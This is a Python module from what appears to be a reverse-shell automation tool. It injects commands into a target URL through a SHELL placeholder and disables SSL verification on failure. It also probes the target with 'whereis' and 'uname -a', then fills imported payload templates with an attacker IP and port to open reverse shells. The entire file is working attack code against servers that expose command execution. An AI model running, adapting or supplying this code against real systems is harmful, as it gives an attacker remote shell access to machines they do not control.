import urllib.parse
import warnings

import requests
from requests.exceptions import SSLError
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from data import payloads, types
from modules import logger, transform

# Suppress the InsecureRequestWarning when SSL verification is disabled
warnings.simplefilter("ignore", InsecureRequestWarning)


def execute(url: str, command: str) -> str:
    """
    Execute a command on the target system using the specified URL.
        - Ignores SSL verification errors
    """

    if "SHELL" not in url:
        logger.log("Invalid URL. Please make sure the formatting is correct.")
        exit()
    command_string = url.replace("SHELL", command)
    try:
        # Attempt to make the request with SSL verification
        data = requests.get(command_string)
    except SSLError:
        # If an SSL error occurs, retry the request with SSL verification disabled
        logger.log("SSL verification failed. Retrying with verify=False.")
        data = requests.get(command_string, verify=False)

    return data.text


def find_bins(url: str, verbose: bool, bins: list, only: list = []) -> list:
    valid = []
    for bin in bins:
        if len(only) > 0:
            if bin not in only:
                continue
        result = execute(url, f"whereis {bin}")
        logger.log(result, types.Status.VERBOSE, True, verbose)
        for path in result.split(" "):
            if "bin" in path and bin in path:
                path = transform.filter_tag(path)
                valid.append({bin: path})
                logger.log(f"{bin} found at {path}", types.Status.SUCCESS)
    return valid


def reverse_connection(valid_bins: list, valid_shells: list, url: str, ip: str, port: int, verbose: bool):
    logger.log(f"Bins to test: {len(valid_bins)}")
    logger.log(f"Shells to test: {len(valid_shells)}")
    for bin in valid_bins:
        logger.log(f"Attempting {list(bin.keys())[0]} payloads for path {list(bin.values())[0]}", types.Status.ALERT)
        for payload in payloads.bins[list(bin.keys())[0]]:
            for shell in valid_shells:
                cmd = urllib.parse.quote(
                    payload.replace("PATHHERE", list(bin.values())[0])
                    .replace("IPHERE", ip)
                    .replace("PORTHERE", str(port))
                    .replace("SHELLHERE", list(shell.keys())[0])
                )
                result = execute(url, cmd)
                logger.log(result, types.Status.VERBOSE, True, verbose)


def verify(url: str, verbose: bool) -> bool:
    data = execute(url, "uname -a")
    logger.log(data, types.Status.VERBOSE, True, verbose)
    return "linux" in data.lower()
